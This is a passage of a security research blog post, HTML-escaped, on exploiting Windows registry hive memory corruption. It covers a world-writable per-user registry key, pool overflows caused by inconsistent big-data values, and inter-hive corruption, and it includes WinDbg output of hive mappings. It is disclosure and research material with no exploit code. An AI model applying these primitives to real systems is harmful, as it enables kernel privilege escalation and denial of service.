restricted groups such as Interactive (S-1-5-4), Users (S-1-5-32-545), or Authenticated Users (S-1-5-11), which may be something to keep in mind.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;Apart from global system hives, I also discovered the curious case of the &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c17&quot;&gt;HKCU\Software\Microsoft\Input\TypingInsights&lt;/span&gt;&lt;span&gt;&amp;nbsp;key &lt;/span&gt;&lt;span&gt;being present in every user&amp;#39;s hive, which&lt;/span&gt;&lt;span&gt;&amp;nbsp;permits read and write access to all other users in the system.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;I reported it to Microsoft in December 2023 (&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c13&quot;&gt;&lt;a href=&quot;https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/14_HKCU_TypingInsights_permissive_access_rights&quot;&gt;link to report&lt;/a&gt;&lt;/span&gt;&lt;span&gt;), but it was deemed low severity and hasn&amp;#39;t been fixed so far.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This decision is somewhat understandable, as the behavior doesn&amp;#39;t have direct, serious consequences for system securit&lt;/span&gt;&lt;span&gt;y, but it still can work as a useful exploitation technique. &lt;/span&gt;&lt;span&gt;Since any user can open a key for writing in the user hive of any other user, they gain the ability to:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_l1re9pb3r2ti-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c26 c16 li-bullet-0&quot;&gt;&lt;span&gt;Fill the entire 2 GiB space of that hive, resulting in a DoS condition (the user and their applications cannot write to HKCU) and potentially enabling exploitation of bugs related to mishandling OOM conditions within the hive.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c26 c16 li-bullet-0&quot;&gt;&lt;span&gt;Write not just to the &lt;/span&gt;&lt;span&gt;&amp;quot;TypingInsights&amp;quot; key in the HKCU itself, but also to any of the corresponding keys in the differencing hives overlaid on top of it.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This provides an opportunity to attack applications running within app/server silos with that user&amp;#39;s permissions.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c26 c16 li-bullet-0&quot;&gt;&lt;span&gt;P&lt;/span&gt;&lt;span&gt;erform hive-based memory corruption attacks not only on system hives, but also on the hives of specific users&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;, allowing for a more lateral privilege escalation scenario.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;ormwWEjHLs-c34&quot;&gt;&lt;span&gt;&lt;br&gt;&lt;/span&gt;&lt;span&gt;As demonstrated, even a seemingly minor weakness in the security descriptor of a&lt;/span&gt;&lt;span&gt;&amp;nbsp;single &lt;/span&gt;&lt;span&gt;registry key can have significant consequences for system security.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;In summary, attacking system hives with hive memory corruption is certainly possible, but requires finding a very good vulnerability that can be triggered on existing keys, without the need to load a custom hive.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This is a good starting point, but perhaps we can find a more universal technique.&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;ormwWEjHLs-c18&quot; id=&quot;h.dk41btqgfqk6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c27&quot;&gt;Abusing regf inconsistency to trigger kernel pool corruption&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;While hive mappings in memory are isolated and self-contained to some extent, they do not exist in a vacuum.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The Windows kernel allocates and manages many additional registry-related objects within the kernel pool space, as discussed in &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c13&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2025/04/the-windows-registry-adventure-6-kernel.html&quot;&gt;blog post&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c13&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2025/04/the-windows-registry-adventure-6-kernel.html&quot;&gt;&amp;nbsp;#&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c13&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2025/04/the-windows-registry-adventure-6-kernel.html&quot;&gt;6&lt;/a&gt;&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;These objects serve as optimization through data caching, and help implement certain functionalities that cannot be achieved solely through operations on the hive space (e.g., transactions, layered keys).&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Some of these objects are long-lived and persist in memory as long as the hive is mounted.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Other buffers are allocated and immediately freed within the same syscall, serving only as temporary data storage.&lt;/span&gt;&lt;span&gt;&amp;nbsp;T&lt;/span&gt;&lt;span&gt;he memory safety of all these objects is closely tied to the consistency of the corresponding data within the hive mapping.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;After the kernel meticulously verifies the hive validity in CmCheckRegistry and related functions, it assumes that &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;the registry hive&amp;#39;s data maintains consistency with its own structure and associated auxiliary structures.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;For a potential attacker, this means that hive memory corruption can be potentially escalated to some forms of pool corruption. This provides a much broader spectrum of options for exploitation, as there are a variety of pool allocations used by various parts of the kernel.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In fact, I even took advantage of this behavior &lt;/span&gt;&lt;span&gt;in my reports to Microsoft&lt;/span&gt;&lt;span&gt;: in every case of a use-after-free on a security descriptor, I would enable Special Pool and trigger a reference to the cached copy of that descriptor on the pools through the _CM_KEY_CONTROL_BLOCK.CachedSecurity field.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;I did this because it is much easier to generate a reliably reproducible crash by accessing a freed allocation on the pool than when accessing a freed but still mapped cell in the hive.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c34 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;However, this is certainly not the only way to cause pool memory corruption by modifying the internal data of the regf format.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Another idea would be, for example, to create a very long &amp;quot;big data&amp;quot; value in the hive (over ~16 KiB in a hive with version &amp;ge; 1.4) and then cause _CM_KEY_VALUE.DataLength to be inconsistent with the _CM_BIG_DATA.Count field, which denotes the number of 16-kilobyte chunks in the backing buffer.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;If we look at the implementation of the internal CmpGetValueData function, it is easy to see that it allocates a paged pool buffer based on the former value, and then copies data to it based on the latter one.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Therefore, if we set _CM_KEY_VALUE.DataLength to a number less than 16344 &amp;times; (_CM_BIG_DATA.Count - 1), then the next time the value&amp;#39;s data is requested, a linear pool buffer overflow will occur.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;This type of primitive is promising, as it opens the door to targeting a much wider range of objects in memory than was previously possible.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The next step would likely involve finding a suitable object to place immediately after the overwritten buffer &lt;/span&gt;&lt;span&gt;(e.g., pipe attributes, as mentioned in &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c13&quot;&gt;&lt;a href=&quot;https://www.sstic.org/media/SSTIC2020/SSTIC-actes/pool_overflow_exploitation_since_windows_10_19h1/SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1-bayet_fariello.pdf&quot;&gt;this article&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;from 2020)&lt;/span&gt;&lt;span&gt;, and then corrupting it to achieve a more powerful primitive like arbitrary kernel read/write.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In short, such an attack would boil down to a fairly generic &lt;/span&gt;&lt;span&gt;exploitation of &lt;/span&gt;&lt;span&gt;pool-based memory corruption, a topic widely discussed in existing resources.&lt;/span&gt;&lt;span&gt;&amp;nbsp;We won&amp;#39;t explore this further here,&lt;/span&gt;&lt;span&gt;&amp;nbsp;and instead encourage interested readers to investigate it on their own.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;ormwWEjHLs-c24&quot; id=&quot;h.2p4o36ghdm03&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c35 ormwWEjHLs-c14&quot;&gt;Inter-hive memory corruption&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;So far in our analysis, we have assumed that with a hive-based memory corruption bug, we can only modify data within the specific hive we are operating on.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In practice, however, this is not necessarily the case, because there might be other data located in the immediate vicinity of our bin&amp;#39;s mapping in memory.&lt;/span&gt;&lt;span&gt;&amp;nbsp;If that happens&lt;/span&gt;&lt;span&gt;, it might be possible to seamlessly cross the boundary between the original hive and some more interesting objects at higher memory addresses using a linear buffer overflow.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In the following sections, we will look at two such scenarios: one where the &lt;/span&gt;&lt;span&gt;mapping of the attacked hive&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;is &lt;/span&gt;&lt;span&gt;in the user-mode space of the &amp;quot;Registry&amp;quot; process, and one where it resides in the kernel address space.&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;ormwWEjHLs-c18&quot; id=&quot;h.ywzu8r9jn9a&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c27 ormwWEjHLs-c14&quot;&gt;Other hive mappings in the user space of the Registry process&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;Mapping the section views of hives &lt;/span&gt;&lt;span&gt;in the user space of the Registry process is the default behavior for the vast majority of the registry.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The layout of individual mappings in memory can be easily observed from WinDbg.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;To do this, find the Registry process (usually the second in the system process list), switch to its context, and then issue the &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c13&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/-vad&quot;&gt;!vad&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;command.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;An example of performing these operations is shown below.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;ormwWEjHLs-c19&quot;&gt;&lt;tr class=&quot;ormwWEjHLs-c12&quot;&gt;&lt;td class=&quot;ormwWEjHLs-c39&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;0: kd&amp;gt; !process 0 0&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;**** NT ACTIVE PROCESS DUMP ****&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;PROCESS ffffa58fa069f040&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;&amp;nbsp; &amp;nbsp; SessionId: none &amp;nbsp;Cid: 0004 &amp;nbsp; &amp;nbsp;Peb: 00000000 &amp;nbsp;ParentCid: 0000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;&amp;nbsp; &amp;nbsp; DirBase: 001ae002 &amp;nbsp;ObjectTable: ffffe102d72678c0 &amp;nbsp;HandleCount: 3077.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;&amp;nbsp; &amp;nbsp; Image: System&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;PROCESS ffffa58fa074a080&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;&amp;nbsp; &amp;nbsp; SessionId: none &amp;nbsp;Cid: 007c &amp;nbsp; &amp;nbsp;Peb: 00000000 &amp;nbsp;ParentCid: 0004&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;&amp;nbsp; &amp;nbsp; DirBase: 1025ae002 &amp;nbsp;ObjectTable: ffffe102d72d1d00 &amp;nbsp;HandleCount: &amp;lt;Data Not Accessible&amp;gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;&amp;nbsp; &amp;nbsp; Image: Registry&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;[...]&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;0: kd&amp;gt; .process ffffa58fa074a080&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;Implicit process is now ffffa58f`a074a080&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;WARNING: .cache forcedecodeuser is not enabled&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;0: kd&amp;gt; !vad&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;VAD &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Level &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Start &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; End &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;Commit&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;ffffa58fa207f740 &amp;nbsp;5 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;152e7a20 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;152e7a2f &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 0 Mapped &amp;nbsp; &amp;nbsp; &amp;nbsp; READONLY &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; \Windows\System32\config\SAM&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;ffffa58fa207dbc0 &amp;nbsp;4 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;152e7a30 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;152e7b2f &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 0 Mapped &amp;nbsp; &amp;nbsp; &amp;nbsp; READONLY &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; \Windows\System32\config\DEFAULT&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;ffffa58fa207dc60 &amp;nbsp;5 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;152e7b30 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;152e7b3f &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 0 Mapped &amp;nbsp; &amp;nbsp; &amp;nbsp; READONLY &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; \Windows\System32\config\SECURITY&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;ffffa58fa207d940 &amp;nbsp;3 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;152e7b40 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;152e7d3f &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 0 Mapped &amp;nbsp; &amp;nbsp; &amp;nbsp; READONLY &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; \Windows\System32\config\SOFTWARE&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;ffffa58fa207dda0 &amp;nbsp;5 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;152e7d40 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;152e7f3f &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 0 Mapped &amp;nbsp; &amp;nbsp; &amp;nbsp; READONLY &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; \Windows\System32\config\SOFTWARE&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;[...]&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;ffffa58fa207e840 &amp;nbsp;5 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;152ec940 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;152ecb3f &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 0 Mapped &amp;nbsp; &amp;nbsp; &amp;nbsp; READONLY &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; \Windows\System32\config\SOFTWARE&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;ffffa58fa207b780 &amp;nbsp;3 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;152ecb40 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;152ecd3f &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 0 Mapped &amp;nbsp; &amp;nbsp; &amp;nbsp; READONLY &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; \Windows\System32\config\SOFTWARE&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;ffffa58fa0f98ba0 &amp;nbsp;5 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;152ecd40 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;152ecd4f &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 0 Mapped &amp;nbsp; &amp;nbsp; &amp;nbsp; READONLY &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; \EFI\Microsoft\Boot\BCD&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;ffffa58fa3af5440 &amp;nbsp;4 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;152ecd50 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;152ecd8f &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 0 Mapped &amp;nbsp; &amp;nbsp; &amp;nbsp; READONLY &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; \Windows\ServiceProfiles\NetworkService\NTUSER.DAT&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;ffffa58fa3bfe9c0 &amp;nbsp;5 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;152ecd90 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;152ecdcf &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 0 Mapped &amp;nbsp; &amp;nbsp; &amp;nbsp; READONLY &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; \Windows\ServiceProfiles\LocalService\NTUSER.DAT&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;ffffa58fa3ca3d20 &amp;nbsp;1 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;152ecdd0 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;152ece4f &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 0 Mapped &amp;nbsp; &amp;nbsp; &amp;nbsp; READONLY &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; \Windows\System32\config\BBI&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;ffffa58fa2102790 &amp;nbsp;6 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;152ece50 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;152ecf4f &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 0 Mapped &amp;nbsp; &amp;nbsp; &amp;nbsp; READONLY &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; \Users\user\NTUSER.DAT&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;ffffa58fa4145640 &amp;nbsp;5 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;152ecf50 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;152ed14f &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 0 Mapped &amp;nbsp; &amp;nbsp; &amp;nbsp; READONLY &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; \Windows\System32\config\DRIVERS&lt;/span&gt;&lt;/p&gt;
